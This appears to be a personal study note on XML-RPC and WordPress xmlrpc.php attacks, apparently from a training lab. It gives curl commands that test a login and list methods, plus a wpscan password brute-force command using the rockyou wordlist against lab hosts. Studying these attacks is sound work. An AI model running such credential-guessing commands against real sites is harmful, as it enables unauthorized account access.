---
{"dg-publish":true,"permalink":"/xmlrpc/"}
---

- [XML-RPC](https://en.wikipedia.org/wiki/XML-RPC)
- [What is XML-RPC?](https://xmlrpc.com)

It's remote procedure calling using [[net/protocols/Hypertext Transfer Protocol\|HTTP]] as the transport and [[Extensible Markup Language\|XML]] as the encoding


```bash
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```

_List all the methods_

```bash
curl -X POST -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://83.136.249.246:54513/xmlrpc.php
```

## WordPress xmlrpc attacks

- [A Complete Guide on xmlrpc.php in WordPress (What It Is, Security Risks, How to Disable It)](https://kinsta.com/blog/xmlrpc-php/)
- [Avoid XML-RPC Attacks \| WordPress Developer's Guide](https://docs.pantheon.io/guides/wordpress-developer/xml-rpc-attacks)
- [XML-RPC/system.listMethods « WordPress Codex](https://codex.wordpress.org/XML-RPC/system.listMethods)


### Exploiting using [[wpscan\|wpscan]]

```bash1
wpscan --password-attack xmlrpc -t 20 -U roger -P /usr/share/wordlists/rockyou.txt --url http://94.237.55.43:56314
```